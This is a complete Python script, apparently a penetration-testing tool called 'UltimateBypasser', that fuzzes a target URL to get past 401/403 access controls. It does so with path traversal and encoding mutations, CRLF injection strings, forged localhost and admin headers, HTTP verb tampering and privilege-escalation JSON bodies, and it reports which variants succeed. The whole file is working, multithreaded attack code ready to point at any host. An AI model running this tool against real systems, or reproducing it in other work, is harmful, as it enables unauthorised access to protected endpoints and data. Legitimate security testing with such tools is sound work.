#!/usr/bin/env python3
import requests
import argparse
import sys
import signal
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Set, Tuple
import threading

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Signal Handler for immediate Ctrl+C exit
def signal_handler(sig, frame):
    print("\n\n[!] User interrupted. Shutting down cleanly...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


class UltimateBypasser:
    def __init__(self, target_url: str, custom_headers: List[str] = None, threads: int = 10, timeout: int = 5, verbose: bool = False):
        self.parsed = urlparse(target_url)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.path = self.parsed.path if self.parsed.path else "/"
        self.methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
        self.successes = []
        self.session = requests.Session()
        self.session.verify = False
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.lock = threading.Lock()
        self.custom_headers = self._parse_custom_headers(custom_headers or [])
        self.tested_combinations = set()  # Track tested combinations to avoid duplicates
        
        # Performance optimization: reuse connections
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=threads,
            pool_maxsize=threads,
            max_retries=0
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    def _parse_custom_headers(self, headers_list: List[str]) -> List[Dict[str, str]]:
        """Parse custom headers from command line format 'Key: Value'"""
        parsed = []
        for header in headers_list:
            if ':' in header:
                key, value = header.split(':', 1)
                parsed.append({key.strip(): value.strip()})
        return parsed

    def get_path_variations(self) -> List[str]:
        """Generates all recursive junction injections, version fuzzing, and encoding."""
        path_str = self.path.strip('/')
        segments = path_str.split('/') if path_str else []
        variations = set()
        
        full_path = "/" + path_str if path_str else "/"
        variations.add(full_path)

        # 1. API VERSION FUZZING
        version_payloads = ["v1", "v2", "v3", "v4", "v5", "v0", "v1.0", "v1.1", "v2.0", "api/v1", "api/v2", "api"]
        for i, seg in enumerate(segments):
            if any(x in seg.lower() for x in ['v1', 'v2', 'v3', 'v4', 'api']):
                for vp in version_payloads:
                    temp_segs = segments.copy()
                    temp_segs[i] = vp
                    variations.add("/" + "/".join(temp_segs))

        # 2. RECURSIVE JUNCTION INJECTION
        junction_payloads = [
            "..;/", "..;", ".;/", "./", "//", "/./", "/%2e/", "/%2e%2e/",
            "\\", "..\\", ".\\", "..\\/", "..;\\", "..%5c", "..%2f",
            "..%00/", "..%0d/", "..%5c..%5c", "/%2e%2e%3b/", 
            "...//", "..../", ".../", "....//", "/...;/", "//..;/",
            "%2e%2e/", "%252e%252e/", "..%252f", "..%255c"
        ]
        for i in range(len(segments) + 1):
            for payload in junction_payloads:
                temp_segs = segments.copy()
                temp_segs.insert(i, payload)
                joined = ("/" + "/".join(temp_segs)).replace("//", "/")
                if joined != full_path:
                    variations.add(joined)

        # 3. CASE MUTATIONS
        if segments:
            # First char upper
            variations.add("/" + "/".join([seg[0].upper() + seg[1:] if seg else seg for seg in segments]))
            # All upper
            variations.add("/" + "/".join([seg.upper() for seg in segments]))
            # Alternating case
            variations.add("/" + "/".join([
                "".join([c.upper() if j % 2 == 0 else c.lower() for j, c in enumerate(seg)])
                for seg in segments
            ]))

        # 4. ENCODING VARIATIONS (optimized - only key positions)
        if len(full_path) > 1:
            # Encode first character after each /
            for i, char in enumerate(full_path):
                if i > 0 and full_path[i-1] == '/' and char != '/':
                    variations.add(full_path[:i] + f"%{ord(char):02x}" + full_path[i+1:])
            
            # Double encoding
            variations.add(full_path.replace('/', '%252f'))
            variations.add(full_path.replace('/', '%2f'))
            
            # Unicode encoding
            variations.add(full_path.replace('/', '%u002f'))
            variations.add(full_path.replace('/', '%uff0f'))  # Fullwidth solidus
            
            # Mixed encoding
            if len(full_path) > 3:
                variations.add(full_path[0] + "%2e" + full_path[2:])
                variations.add(full_path[0] + "%252e" + full_path[2:])

        # 5. QUERY PARAMETER BYPASSES (Enhanced)
        bypass_params = [
            # Auth/Admin bypasses
            "?debug=true", "?debug=1", "?admin=true", "?admin=1", 
            "?is_admin=true", "?user=admin", "?verify=false", "?bypass=true",
            "?authenticated=true", "?auth=1", "?authorized=true",
            
            # Format/Output manipulation
            "?format=json", "?format=xml", "?format=yaml", "?format=raw",
            "?output=json", "?type=json", "?contentType=application/json",
            
            # Visibility/Access control
            "?public=true", "?is_public=true", "?public=1", "?is_public=1",
            "?private=false", "?internal=false", "?external=true",
            
            # Development/Testing flags
            "?trace=1", "?test=1", "?dev=1", "?internal=true", "?staging=1",
            "?env=dev", "?env=test", "?env=prod", "?mode=debug",
            
            # HTTP Method Override
            "?_method=GET", "?_method=POST", "?_method=PUT", "?_method=DELETE",
            "?method=GET", "?http_method=GET",
            
            # Role/Privilege escalation
            "?role=admin", "?privilege=admin", "?level=admin", "?access=admin",
            "?group=admin", "?type=admin", "?profile=admin",
            
            # IP/Source spoofing
            "?source=127.0.0.1", "?ip=127.0.0.1", "?local=true", "?localhost=1",
            "?from=127.0.0.1", "?origin=localhost",
            
            # JSONP/Callback
            "?callback=a", "?jsonp=a", "?cb=x",
            
            # Null byte injection
            "?id=1%00", "?user=admin%00", "?file=index%00",
            
            # Boolean logic bypasses
            "?override=true", "?force=true", "?skip=true", "?ignore=true",
            "?disabled=true", "?enabled=false", "?check=false",
            
            # Version/API keys
            "?v=1", "?version=1.0", "?api_version=v1", "?key=test",
            
            # Special parameters
            "?show_all=true", "?all=1", "?full=true", "?complete=true",
            "?limit=9999", "?offset=0", "?page=1",
        ]
        for param in bypass_params:
            variations.add(full_path + param)
        
        # 6. SUFFIX MUTATIONS (Enhanced)
        suffixes = [
            # Path manipulation
            "/", "//", "///", "/..;", "/..", "/.", "%00", "%20", "%09",
            "/;", "/;/", ";;", "?", "??", "#", "##",
            
            # File extensions
            ".json", ".xml", ".html", ".php", ".asp", ".aspx", ".jsp",
            ".txt", ".csv", ".yaml", ".yml", ".conf", ".config",
            
            # Backup/Special files
            "\\", ".bak", "~", ".old", ".orig", ".swp", ".tmp",
            ".1", ".2", ".backup", ".save", ".copy",
            
            # Special chars
            "%0a", "%0d", "%0d%0a", "%23", "%3f", "%26",
        ]
        for suffix in suffixes:
            variations.add(full_path + suffix)
        
        # 7. HTTP PARAMETER POLLUTION & SPECIAL INJECTIONS
        variations.add(full_path + "?id=1&id=2")
        variations.add(full_path + "?id[]=1&id[]=2")
        variations.add(full_path + "?[]")
        variations.add(full_path + "?param=value&param=")
        
        # 8. PATH NORMALIZATION EXPLOITS
        if segments:
            # Remove segments (simulating path traversal filtering)
            for i in range(len(segments)):
                temp_segs = segments.copy()
                temp_segs[i] = ""
                clean = "/".join([s for s in temp_segs if s])
                variations.add("/" + clean)
            
            # Duplicate segments
            for i in range(len(segments)):
                temp_segs = segments.copy()
                temp_segs.insert(i, segments[i])
                variations.add("/" + "/".join(temp_segs))
        
        # 9. PROTOCOL CONFUSION / REQUEST SMUGGLING PATTERNS
        variations.add(full_path + " HTTP/1.1")
        variations.add(full_path + "\r\n")
        variations.add(full_path + "\n")
        variations.add(full_path + "\r")
        
        # 10. UNICODE NORMALIZATION BYPASSES
        # Convert some chars to Unicode equivalents
        unicode_variants = []
        for char in full_path:
            if char == '/':
                unicode_variants.append('\u2044')  # Fraction slash
            elif char == '.':
                unicode_variants.append('\u2024')  # One dot leader
            else:
                unicode_variants.append(char)
        if unicode_variants:
            variations.add(''.join(unicode_variants))
        
        # 11. WILDCARD / GLOB PATTERNS
        variations.add(full_path + "/*")
        variations.add(full_path + "/**")
        if segments:
            variations.add("/" + "/".join(segments[:-1]) + "/*")
        
        # 12. CRLF INJECTION PATTERNS
        variations.add(full_path + "%0d%0aX-Ignore: true")
        variations.add(full_path + "%0aX-Forwarded-For: 127.0.0.1")
        
        # 13. NGINX/Apache specific bypasses
        variations.add(full_path + "/.")
        variations.add(full_path + "/.randomnonexistent")
        variations.add("/" + "/".join(segments) + "/$")
        
        return list(variations)

    def get_headers(self) -> List[Dict[str, str]]:
        """Enhanced header bypass matrix"""
        base_headers = [
            # IP Spoofing Headers
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "localhost"},
            {"X-Forwarded-For": "::1"},
            {"X-Forwarded-For": "0.0.0.0"},
            {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1:80"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"Cluster-Client-IP": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"X-Client-Ip": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},  # Cloudflare
            {"Fastly-Client-IP": "127.0.0.1"},  # Fastly CDN
            {"X-Cluster-Client-IP": "127.0.0.1"},
            {"WL-Proxy-Client-IP": "127.0.0.1"},
            {"Proxy-Client-IP": "127.0.0.1"},
            
            # URL/Path Rewriting
            {"X-Original-URL": self.path},
            {"X-Rewrite-URL": self.path},
            {"X-Original-Uri": self.path},
            {"X-Forwarded-Prefix": self.path},
            {"X-Forwarded-Path": self.path},
            
            # Host Headers
            {"Host": "localhost"},
            {"Host": "127.0.0.1"},
            {"X-Forwarded-Server": "localhost"},
            {"X-Forwarded-Host": "localhost:80"},
            
            # Protocol/Scheme manipulation
            {"X-Forwarded-Proto": "https"},
            {"X-Forwarded-Protocol": "https"},
            {"X-Url-Scheme": "https"},
            {"X-Scheme": "https"},
            {"Front-End-Https": "on"},
            
            # HTTP Method Override
            {"X-Original-Method": "GET"},
            {"X-HTTP-Method": "GET"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-Method-Override": "GET"},
            {"X-HTTP-Method-Override": "PUT"},
            {"X-HTTP-Method-Override": "DELETE"},
            {"_method": "PUT"},
            
            # Authentication/Authorization Bypass
            {"X-Authenticated-User": "admin"},
            {"X-User": "admin"},
            {"X-Username": "admin"},
            {"X-User-Id": "1"},
            {"X-Role": "admin"},
            {"X-Privilege": "admin"},
            {"X-Auth-User": "admin"},
            {"Authorization": "Bearer null"},
            {"Authorization": "Bearer undefined"},
            {"X-Api-Key": "test"},
            
            # Content Type Manipulation
            {"Content-Type": "application/json"},
            {"Content-Type": "application/x-www-form-urlencoded"},
            {"Content-Type": "text/xml"},
            {"Content-Type": "application/xml"},
            {"Accept": "*/*"},
            {"Accept": "application/json"},
            
            # AJAX/API Indicators
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Requested-By": "XMLHttpRequest"},
            {"X-AJAX": "true"},
            
            # Referrer/Origin
            {"Referer": self.base_url + self.path},
            {"Referer": "http://localhost"},
            {"Referer": "http://127.0.0.1"},
            {"Origin": self.base_url},
            {"Origin": "http://localhost"},
            {"Origin": "null"},
            
            # Custom/Proprietary Headers
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-By": "127.0.0.1"},
            {"X-Forwarded-From": "127.0.0.1"},
            {"X-Gateway": "internal"},
            {"X-Debug": "true"},
            {"X-Debug-Mode": "1"},
            {"X-Test": "true"},
            {"X-Internal": "true"},
            
            # Cache Poisoning / CDN Bypass
            {"X-Cache-Key": "bypass"},
            {"X-Cache-Status": "bypass"},
            {"Pragma": "no-cache"},
            {"Cache-Control": "no-cache"},
            {"X-No-Cache": "true"},
            
            # Range Request Bypass
            {"Range": "bytes=0-1"},
            {"Range": "bytes=0-0"},
            
            # Proxy/Load Balancer specific
            {"Via": "1.1 localhost"},
            {"Max-Forwards": "0"},
            {"Forwarded": "for=127.0.0.1;host=localhost;proto=https"},
            
            # WebSocket upgrade attempt
            {"Upgrade": "websocket"},
            {"Connection": "Upgrade"},
            
            # Custom header injections
            {"X-Forwarded-Port": "443"},
            {"X-Forwarded-SSL": "on"},
            {"X-Frame-Options": "ALLOWALL"},
        ]
        
        # Add custom headers
        if self.custom_headers:
            base_headers.extend(self.custom_headers)
        
        return base_headers
    
    def get_header_combinations(self) -> List[Dict[str, str]]:
        """Generate powerful multi-header combinations for advanced bypasses"""
        combinations = [
            # IP Spoofing combinations
            {
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1"
            },
            {
                "X-Forwarded-For": "localhost",
                "X-Forwarded-Host": "localhost",
                "X-Forwarded-Proto": "https"
            },
            # Path rewrite + IP spoof
            {
                "X-Original-URL": self.path,
                "X-Forwarded-For": "127.0.0.1"
            },
            # Method override + Auth
            {
                "X-HTTP-Method-Override": "GET",
                "X-Authenticated-User": "admin"
            },
            # Full internal request simulation
            {
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Forwarded-Proto": "https",
                "X-Forwarded-Host": "localhost"
            },
            # CDN/Proxy bypass
            {
                "CF-Connecting-IP": "127.0.0.1",
                "True-Client-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1"
            },
            # Admin simulation
            {
                "X-User": "admin",
                "X-Role": "admin",
                "X-Privilege": "admin"
            },
            # Debug mode activation
            {
                "X-Debug": "true",
                "X-Test": "true",
                "X-Internal": "true"
            },
        ]
        
        return combinations

    def get_bypass_payloads(self) -> List[Dict]:
        """Generate body payloads for POST/PUT/PATCH requests"""
        return [
            # JSON payloads
            {"admin": True},
            {"is_admin": True},
            {"role": "admin"},
            {"privilege": "admin"},
            {"authenticated": True},
            {"bypass": True},
            {"debug": True},
            {"test": True},
            {"internal": True},
            {"user": "admin"},
            {"username": "admin"},
            {"_method": "GET"},
            {"__method": "GET"},
            
            # Parameter pollution
            {"id": [1, 2]},
            {"user": ["admin", "user"]},
            
            # Null/undefined injection
            {"validate": None},
            {"check": None},
            {"verify": False},
            
            # Boolean bypasses
            {"public": True},
            {"private": False},
            {"disabled": True},
            {"enabled": False},
        ]
    
    def test_request(self, method: str, path_var: str) -> List[str]:
        """Test a single path variation with all headers"""
        results = []
        full_url = self.base_url + path_var
        
        # Check if we've already tested this combination
        test_key = f"{method}:{path_var}"
        with self.lock:
            if test_key in self.tested_combinations:
                return results
            self.tested_combinations.add(test_key)
        
        try:
            # Baseline check
            res = self.session.request(method, full_url, timeout=self.timeout, allow_redirects=False)
            status = res.status_code
            length = len(res.content)
            
            # Print result (only if verbose or if successful)
            if self.verbose or status in [200, 201, 204]:
                with self.lock:
                    print(f"{method:<8} | {status:<5} | {length:<8} | {path_var[:80]}")
            
            # Filter out OPTIONS with 0 length (usually just CORS preflight, not a real bypass)
            if status in [200, 201, 204]:
                if not (method == "OPTIONS" and length == 0):
                    results.append(f"SUCCESS: {method} {full_url} | Length: {length} | Status: {status}")
            
            # Advanced bypass attempts on blocked requests
            if status in [401, 403, 405, 407, 429]:
                # Try single headers
                headers_to_test = self.get_headers()
                for header in headers_to_test[:30]:  # Limit to avoid too many requests
                    try:
                        h_res = self.session.request(
                            method, full_url, headers=header, 
                            timeout=3, allow_redirects=False
                        )
                        if h_res.status_code in [200, 201, 204]:
                            h_name = list(header.keys())[0]
                            h_value = list(header.values())[0]
                            h_length = len(h_res.content)
                            with self.lock:
                                print(f"  [!] BYPASS: {h_name}: {h_value} → {h_res.status_code} (Length: {h_length})")
                            results.append(
                                f"HEADER BYPASS: {method} {full_url} | Header: {h_name}: {h_value} | Length: {h_length} | Status: {h_res.status_code}"
                            )
                    except requests.exceptions.RequestException:
                        continue
                
                # Try header combinations (more powerful)
                header_combos = self.get_header_combinations()
                for combo in header_combos:
                    try:
                        combo_res = self.session.request(
                            method, full_url, headers=combo,
                            timeout=3, allow_redirects=False
                        )
                        if combo_res.status_code in [200, 201, 204]:
                            combo_str = ", ".join([f"{k}: {v}" for k, v in combo.items()])
                            combo_length = len(combo_res.content)
                            with self.lock:
                                print(f"  [!!] COMBO BYPASS: {combo_str} → {combo_res.status_code} (Length: {combo_length})")
                            results.append(
                                f"COMBO BYPASS: {method} {full_url} | Headers: [{combo_str}] | Length: {combo_length} | Status: {combo_res.status_code}"
                            )
                    except requests.exceptions.RequestException:
                        continue
                
                # HTTP Verb Tampering - try alternative methods
                # This tests if different HTTP methods bypass access controls
                # Example: GET /admin returns 403, but HEAD /admin returns 200
                # Some WAFs/proxies only check certain methods (GET/POST) but not others
                if method in ["GET", "POST"]:
                    alternative_methods = ["PUT", "PATCH", "DELETE", "HEAD"]  # Removed OPTIONS
                    for alt_method in alternative_methods:
                        try:
                            alt_res = self.session.request(
                                alt_method, full_url, timeout=3, allow_redirects=False
                            )
                            alt_length = len(alt_res.content)
                            
                            # Filter out HEAD with 0 length (expected behavior)
                            if alt_res.status_code in [200, 201, 204]:
                                if not (alt_method == "HEAD" and alt_length == 0):
                                    with self.lock:
                                        print(f"  [!] VERB TAMPERING: {method} → {alt_method} → {alt_res.status_code} (Length: {alt_length})")
                                    results.append(
                                        f"VERB TAMPERING: {full_url} | Original: {method} → New: {alt_method} | Length: {alt_length} | Status: {alt_res.status_code}"
                                    )
                        except requests.exceptions.RequestException:
                            continue
                
                # Body-based bypasses for POST/PUT/PATCH
                if method in ["POST", "PUT", "PATCH"]:
                    payloads = self.get_bypass_payloads()
                    for payload in payloads[:10]:  # Limit to avoid too many requests
                        try:
                            # JSON payload
                            body_res = self.session.request(
                                method, full_url,
                                json=payload,
                                headers={"Content-Type": "application/json"},
                                timeout=3,
                                allow_redirects=False
                            )
                            if body_res.status_code in [200, 201, 204]:
                                body_length = len(body_res.content)
                                with self.lock:
                                    print(f"  [!] BODY BYPASS: {payload} → {body_res.status_code} (Length: {body_length})")
                                results.append(
                                    f"BODY BYPASS: {method} {full_url} | Payload: {payload} | Length: {body_length} | Status: {body_res.status_code}"
                                )
                        except requests.exceptions.RequestException:
                            continue
                        
        except requests.exceptions.RequestException as e:
            pass
        
        return results

    def run(self):
        """Execute tests with thread pool"""
        print(f"[*] Target: {self.base_url}{self.path}")
        print(f"[*] Threads: {self.threads}")
        
        path_variations = self.get_path_variations()
        print(f"[*] Testing {len(path_variations)} path variations × {len(self.methods)} methods")
        
        if self.custom_headers:
            print(f"[*] Custom headers: {len(self.custom_headers)}")
            for h in self.custom_headers:
                print(f"    - {list(h.keys())[0]}: {list(h.values())[0]}")
        
        print("-" * 100)
        print(f"{'METHOD':<8} | {'CODE':<5} | {'LENGTH':<8} | PATH")
        print("-" * 100)

        # Create task list
        tasks = [(method, path_var) for method in self.methods for path_var in path_variations]
        
        # Execute with thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_task = {
                executor.submit(self.test_request, method, path_var): (method, path_var)
                for method, path_var in tasks
            }
            
            for future in as_completed(future_to_task):
                try:
                    results = future.result()
                    if results:
                        with self.lock:
                            self.successes.extend(results)
                except Exception as e:
                    pass

    def print_summary(self):
        """Print final results"""
        print("\n" + "=" * 120)
        print(" " * 50 + "BYPASS SUMMARY")
        print("=" * 120)
        
        if not self.successes:
            print("[-] No bypasses found. Access controls are properly configured.")
        else:
            # Remove duplicates and sort
            unique_results = sorted(set(self.successes))
            
            # Categorize results
            success_bypasses = [r for r in unique_results if r.startswith("SUCCESS:")]
            header_bypasses = [r for r in unique_results if r.startswith("HEADER BYPASS:")]
            combo_bypasses = [r for r in unique_results if r.startswith("COMBO BYPASS:")]
            verb_bypasses = [r for r in unique_results if r.startswith("VERB TAMPERING:")]
            body_bypasses = [r for r in unique_results if r.startswith("BODY BYPASS:")]
            
            total = len(unique_results)
            print(f"[+] Found {total} potential bypass(es)!\n")
            
            # Print categorized results
            if success_bypasses:
                print(f"🎯 DIRECT ACCESS BYPASSES ({len(success_bypasses)}):")
                print("-" * 120)
                for i, report in enumerate(success_bypasses, 1):
                    # Parse the report to show it nicely
                    parts = report.split(" | ")
                    print(f"  {i}. {parts[0]}")
                    for part in parts[1:]:
                        print(f"      → {part}")
                print()
            
            if header_bypasses:
                print(f"📋 HEADER-BASED BYPASSES ({len(header_bypasses)}):")
                print("-" * 120)
                for i, report in enumerate(header_bypasses, 1):
                    parts = report.split(" | ")
                    print(f"  {i}. {parts[0]}")
                    for part in parts[1:]:
                        print(f"      → {part}")
                print()
            
            if combo_bypasses:
                print(f"🔥 MULTI-HEADER COMBO BYPASSES ({len(combo_bypasses)}):")
                print("-" * 120)
                for i, report in enumerate(combo_bypasses, 1):
                    parts = report.split(" | ")
                    print(f"  {i}. {parts[0]}")
                    for part in parts[1:]:
                        print(f"      → {part}")
                print()
            
            if verb_bypasses:
                print(f"⚡ HTTP VERB TAMPERING BYPASSES ({len(verb_bypasses)}):")
                print("-" * 120)
                for i, report in enumerate(verb_bypasses, 1):
                    parts = report.split(" | ")
                    print(f"  {i}. {parts[0]}")
                    for part in parts[1:]:
                        print(f"      → {part}")
                print()
            
            if body_bypasses:
                print(f"💉 BODY PAYLOAD BYPASSES ({len(body_bypasses)}):")
                print("-" * 120)
                for i, report in enumerate(body_bypasses, 1):
                    parts = report.split(" | ")
                    print(f"  {i}. {parts[0]}")
                    for part in parts[1:]:
                        print(f"      → {part}")
                print()
        
        print("=" * 120)


def main():
    parser = argparse.ArgumentParser(
        description="Advanced Access Control Bypass Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://api.example.com/admin
  %(prog)s -u https://example.com/api/v1/users -t 20
  %(prog)s -u https://example.com/admin -H "Authorization: Bearer token123"
  %(prog)s -u https://example.com/api -H "X-API-Key: secret" -H "X-Custom: value"
        """
    )
    
    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target URL to test (e.g., https://example.com/admin)"
    )
    
    parser.add_argument(
        "-H", "--header",
        action="append",
        dest="headers",
        help="Custom header to include in tests (format: 'Key: Value'). Can be used multiple times."
    )
    
    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=10,
        help="Number of concurrent threads (default: 10)"
    )
    
    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Request timeout in seconds (default: 5)"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output - show all requests"
    )
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print("[!] Error: URL must start with http:// or https://")
        sys.exit(1)
    
    print("\n" + "=" * 100)
    print(" " * 25 + "ACCESS CONTROL BYPASS TESTER")
    print("=" * 100 + "\n")
    
    auditor = UltimateBypasser(
        args.url, 
        args.headers, 
        args.threads,
        args.timeout,
        args.verbose
    )
    auditor.run()
    auditor.print_summary()


if __name__ == "__main__":
    main()
